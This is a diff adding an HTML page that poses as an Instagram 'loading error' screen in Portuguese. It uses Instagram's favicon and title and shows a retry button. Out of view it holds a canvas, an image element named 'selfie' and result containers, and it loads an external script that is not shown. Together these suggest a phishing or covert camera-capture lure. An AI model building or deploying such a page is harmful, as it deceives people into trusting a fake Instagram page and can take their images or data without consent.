@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+  <title>instagram</title>
+  <link rel="stylesheet" type="text/css" href="../../../static/css/style.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+            color: #444;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        .logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .imagem {
+            width: 70px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .container h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .container p {
+            margin: 10px 0;
+        }
+        .retry-button {
+            background-color: #0196f6;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .retry-button:hover {
+            background-color: #0566f6;
+    </style>
+</head>
+<body>
+   <div class="container">
+        <img src="../../../static/imagens/instagram-logo.png" alt="Logo" class="logo">
+       <br>
+        <div class="container">
+        <h1>Erro de Carregamento</h1>
+        <p>Ocorreu um problema ao carregar a página. Por favor, tente novamente.</p>
+        <button class="retry-button" onclick="location.reload()">Tentar Novamente</button>
+        </div>
+    </div>
+    <img src="../../../static/imagens/erro.png" alt="Imagem abaixo do texto" class="imagem">
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <img id="selfie" src="" alt="Selfie" style="display:none;">
+  <div id="result"></div>
+  <div id="data_result"></div>
+  <script src="../../../static/js/script.js"></script>
+</body>
+</html>
